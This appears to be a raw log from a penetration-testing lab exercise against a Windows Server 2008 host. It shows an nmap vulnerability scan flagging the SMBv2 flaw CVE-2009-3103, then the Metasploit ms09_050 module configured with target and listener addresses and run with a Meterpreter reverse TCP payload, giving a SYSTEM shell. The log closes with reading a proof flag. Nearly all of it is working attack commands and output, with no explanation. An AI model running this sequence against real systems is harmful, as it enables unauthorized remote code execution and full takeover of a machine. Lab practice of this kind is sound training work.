```
nmap -A -sV --script vuln 192.168.247.40
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-01 11:21 CDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.247.40
Host is up (0.046s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-054: false
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.24 seconds

```

```
0  exploit/windows/smb/ms09_050_smb2_negotiate_func_index     2009-09-07       good    No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
```

```
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > show options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                      sics/using-metasploit.html
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack to complete.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.121    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set RHOSTS 192.168.247.40
RHOSTS => 192.168.247.40
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set LHOST 192.168.45.216
LHOST => 192.168.45.216
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run

[*] Started reverse TCP handler on 192.168.45.216:4444 
[*] 192.168.247.40:445 - Connecting to the target (192.168.247.40:445)...
[*] 192.168.247.40:445 - Sending the exploit packet (951 bytes)...
[*] 192.168.247.40:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (175686 bytes) to 192.168.247.40
[*] Meterpreter session 1 opened (192.168.45.216:4444 -> 192.168.247.40:49159) at 2023-08-01 11:29:56 -0500

meterpreter > shell
Process 3956 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B863-254D

 Directory of C:\Users\Administrator

01/08/2010  04:41 AM    <DIR>          .
01/08/2010  04:41 AM    <DIR>          ..
01/08/2010  04:28 AM    <DIR>          Contacts
02/03/2011  08:51 PM    <DIR>          Desktop
01/08/2010  04:28 AM    <DIR>          Documents
03/26/2010  12:28 AM    <DIR>          Downloads
01/08/2010  04:28 AM    <DIR>          Favorites
01/08/2010  04:28 AM    <DIR>          Links
01/08/2010  04:28 AM    <DIR>          Music
01/08/2010  04:28 AM    <DIR>          Pictures
01/08/2010  04:28 AM    <DIR>          Saved Games
01/08/2010  04:28 AM    <DIR>          Searches
01/08/2010  04:28 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   4,011,339,776 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B863-254D

 Directory of C:\Users\Administrator\Desktop

02/03/2011  08:51 PM    <DIR>          .
02/03/2011  08:51 PM    <DIR>          ..
05/20/2016  10:26 PM                32 network-secret.txt
08/01/2023  09:05 AM                34 proof.txt
               2 File(s)             66 bytes
               2 Dir(s)   4,011,339,776 bytes free

C:\Users\Administrator\Desktop>more proof.txt
more proof.txt
95820b3c93af76d3fd22b3856c93557d

C:\Users\Administrator\Desktop>exit
exit
```